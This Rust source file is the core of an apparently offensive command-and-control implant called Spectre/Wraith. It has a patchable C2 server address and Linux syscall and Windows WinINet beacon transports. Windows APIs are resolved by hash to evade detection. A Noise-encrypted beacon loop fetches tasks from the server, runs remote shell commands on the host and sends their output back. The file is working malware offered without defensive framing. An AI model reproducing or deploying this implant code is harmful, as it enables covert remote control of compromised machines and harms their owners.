use crate::utils::syscalls::*;
use alloc::format;
use alloc::vec::Vec;
use serde::{Deserialize, Serialize};
use snow::Builder;

pub mod packet;
use packet::{WraithFrame, FRAME_TYPE_DATA};

// Magic signature for config patching: "WRAITH_CONFIG_BLOCK" (19 bytes)
const CONFIG_MAGIC: [u8; 19] = *b"WRAITH_CONFIG_BLOCK";

#[repr(C)]
pub struct PatchableConfig {
    magic: [u8; 19],
    pub server_addr: [u8; 64],
    pub sleep_interval: u64,
}

// Place in .data section to be writable/patchable
#[link_section = ".data"]
pub static mut GLOBAL_CONFIG: PatchableConfig = PatchableConfig {
    magic: CONFIG_MAGIC,
    server_addr: [0u8; 64], // Zeros to be patched
    sleep_interval: 5000,
};

#[derive(Debug, Serialize, Deserialize, Clone, Copy)]
pub enum TransportType {
    Http,
    Udp,
}

pub struct C2Config {
    pub transport: TransportType,
    pub server_addr: &'static str,
    pub sleep_interval: u64,
}

impl C2Config {
    pub fn get_global() -> Self {
        unsafe {
            // Check if patched
            let addr_ptr = core::ptr::addr_of!(GLOBAL_CONFIG.server_addr);
            let addr_slice = &*addr_ptr;
            let addr_len = addr_slice.iter().position(|&c| c == 0).unwrap_or(64);
            let addr_str = if addr_len > 0 {
                core::str::from_utf8_unchecked(&addr_slice[..addr_len])
            } else {
                "127.0.0.1"
            };

            Self {
                transport: TransportType::Http,
                server_addr: addr_str,
                sleep_interval: core::ptr::addr_of!(GLOBAL_CONFIG.sleep_interval).read(),
            }
        }
    }
}

pub trait Transport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()>;
}

// Linux Implementation
#[cfg(not(target_os = "windows"))]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(not(target_os = "windows"))]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(not(target_os = "windows"))]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        unsafe {
            let sock = sys_socket(2, 1, 0);
            if (sock as isize) < 0 {
                return Err(());
            }

            // Parse host (simplified: assume IPv4)
            // 127.0.0.1 -> 0x0100007F
            let mut ip_bytes = [0u8; 4];
            let mut parts = self.host.split('.');
            for i in 0..4 {
                ip_bytes[i] = parts.next().unwrap_or("0").parse().unwrap_or(0);
            }
            let sin_addr = u32::from_ne_bytes(ip_bytes);

            let addr = SockAddrIn {
                sin_family: 2,
                sin_port: self.port.to_be(),
                sin_addr,
                sin_zero: [0; 8],
            };

            if sys_connect(sock, &addr as *const _ as *const u8, 16) != 0 {
                sys_close(sock);
                return Err(());
            }

            let req = format!(
                "POST /api/v1/beacon HTTP/1.1\r\n\
                 Host: {}\r\n\
                 Content-Type: application/octet-stream\r\n\
                 Content-Length: {}\r\n\
                 Connection: close\r\n\r\n",
                self.host,
                data.len()
            );

            sys_write(sock, req.as_ptr(), req.len());
            sys_write(sock, data.as_ptr(), data.len());

            let mut buf = [0u8; 4096];
            let mut resp_vec = Vec::new();
            loop {
                let n = sys_read(sock, buf.as_mut_ptr(), 4096);
                if n == 0 || (n as isize) < 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..n]);
            }
            sys_close(sock);

            let mut body_start = 0;
            for i in 0..resp_vec.len().saturating_sub(3) {
                if resp_vec[i] == 13 && resp_vec[i + 1] == 10 && resp_vec[i + 2] == 13 && resp_vec[i + 3] == 10 {
                    body_start = i + 4;
                    break;
                }
            }

            if body_start > 0 {
                Ok(resp_vec[body_start..].to_vec())
            } else {
                Ok(Vec::new())
            }
        }
    }
}

// Windows Implementation
#[cfg(target_os = "windows")]
pub struct HttpTransport {
    host: &'static str,
    port: u16,
}

#[cfg(target_os = "windows")]
impl HttpTransport {
    pub fn new(host: &'static str, port: u16) -> Self {
        Self { host, port }
    }
}

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};

#[cfg(target_os = "windows")]
impl Transport for HttpTransport {
    fn request(&mut self, data: &[u8]) -> Result<Vec<u8>, ()> {
        let wininet_hash = hash_str(b"wininet.dll");
        unsafe {
            type InternetOpenA = unsafe extern "system" fn(*const u8, u32, *const u8, *const u8, u32) -> HANDLE;
            type InternetConnectA = unsafe extern "system" fn(HANDLE, *const u8, u16, *const u8, *const u8, u32, u32, u32) -> HANDLE;
            type HttpOpenRequestA = unsafe extern "system" fn(HANDLE, *const u8, *const u8, *const u8, *const u8, *const *const u8, u32, u32) -> HANDLE;
            type HttpSendRequestA = unsafe extern "system" fn(HANDLE, *const u8, u32, *const c_void, u32) -> i32;
            type InternetReadFile = unsafe extern "system" fn(HANDLE, PVOID, u32, *mut u32) -> i32;
            type InternetCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;

            let internet_open: InternetOpenA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetOpenA")));
            let internet_connect: InternetConnectA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetConnectA")));
            let http_open: HttpOpenRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpOpenRequestA")));
            let http_send: HttpSendRequestA = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"HttpSendRequestA")));
            let internet_read: InternetReadFile = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetReadFile")));
            let internet_close: InternetCloseHandle = core::mem::transmute(resolve_function(wininet_hash, hash_str(b"InternetCloseHandle")));

            let h_inet = internet_open(b"Spectre\0".as_ptr(), 1, core::ptr::null(), core::ptr::null(), 0);
            if h_inet.is_null() { return Err(()); }

            let mut host_c = Vec::from(self.host.as_bytes());
            host_c.push(0);
            let h_conn = internet_connect(h_inet, host_c.as_ptr(), self.port, core::ptr::null(), core::ptr::null(), 3, 0, 0);
            if h_conn.is_null() { 
                internet_close(h_inet);
                return Err(()); 
            }

            let h_req = http_open(h_conn, b"POST\0".as_ptr(), b"/api/v1/beacon\0".as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0, 0);
            if h_req.is_null() {
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            if http_send(h_req, core::ptr::null(), 0, data.as_ptr() as *const c_void, data.len() as u32) == 0 {
                internet_close(h_req);
                internet_close(h_conn);
                internet_close(h_inet);
                return Err(());
            }

            let mut resp_vec = Vec::new();
            let mut buf = [0u8; 4096];
            let mut bytes_read = 0;
            loop {
                if internet_read(h_req, buf.as_mut_ptr() as PVOID, 4096, &mut bytes_read) == 0 || bytes_read == 0 {
                    break;
                }
                resp_vec.extend_from_slice(&buf[..bytes_read as usize]);
            }

            internet_close(h_req);
            internet_close(h_conn);
            internet_close(h_inet);

            Ok(resp_vec)
        }
    }
}

pub fn run_beacon_loop(_initial_config: C2Config) -> !
{
    let config = C2Config::get_global();
    let mut transport = HttpTransport::new(config.server_addr, 8080);
    let mut buf = [0u8; 8192];

    // Handshake
    let params: snow::params::NoiseParams = "Noise_XX_25519_ChaChaPoly_BLAKE2s".parse().unwrap();
    let mut noise = Builder::new(params).build_initiator().unwrap();

    let len = noise.write_message(&[], &mut buf).unwrap();
    let resp = match transport.request(&buf[..len]) {
        Ok(r) => r,
        Err(_) => unsafe { crate::utils::syscalls::sys_exit(1) },
    };

    noise.read_message(&resp, &mut []).expect("Handshake read failed");

    let len = noise.write_message(&[], &mut buf).unwrap();
    let _ = transport.request(&buf[..len]); 

    let mut session = noise.into_transport_mode().unwrap();

    loop {
        let beacon_json = r#"{"id": "spectre", "hostname": "target", "username": "root"}"#;
        let frame = WraithFrame::new(FRAME_TYPE_DATA, beacon_json.as_bytes().to_vec());
        let frame_bytes = frame.serialize();

        let len = session.write_message(&frame_bytes, &mut buf).unwrap();

        if let Ok(resp) = transport.request(&buf[..len]) {
            let mut pt = [0u8; 8192];
            if let Ok(len) = session.read_message(&resp, &mut pt) {
                let tasks_json = &pt[..len];
                dispatch_tasks(tasks_json, &mut session, &mut transport);
            }
        }

        crate::utils::obfuscation::sleep(config.sleep_interval);
    }
}

#[derive(Deserialize)]
struct Task {
    id: alloc::string::String,
    #[serde(rename = "type_")]
    task_type: alloc::string::String,
    payload: alloc::string::String,
}

#[derive(Deserialize)]
struct TaskList {
    tasks: alloc::vec::Vec<Task>,
}

fn dispatch_tasks(data: &[u8], session: &mut snow::TransportState, transport: &mut HttpTransport) {
    let clean_data = if let Some(idx) = data.iter().position(|&x| x == 0) {
        &data[..idx]
    } else {
        data
    };

    if let Ok(response) = serde_json::from_slice::<TaskList>(clean_data) {
        for task in response.tasks {
            // Acknowledge task receipt (conceptually, or via log if we had one)
            let _task_id = &task.id; 

            match task.task_type.as_str() {
                "kill" => unsafe { crate::utils::syscalls::sys_exit(0) },
                "shell" => {
                    let shell = crate::modules::shell::Shell;
                    let output = shell.exec(&task.payload);
                    
                    // Send result back (wrapped in WRAITH frame)
                    let frame = WraithFrame::new(FRAME_TYPE_DATA, output);
                    let mut buf = [0u8; 8192];
                    if let Ok(len) = session.write_message(&frame.serialize(), &mut buf) {
                        let _ = transport.request(&buf[..len]);
                    }
                },
                _ => {}
            }
        }
    }
}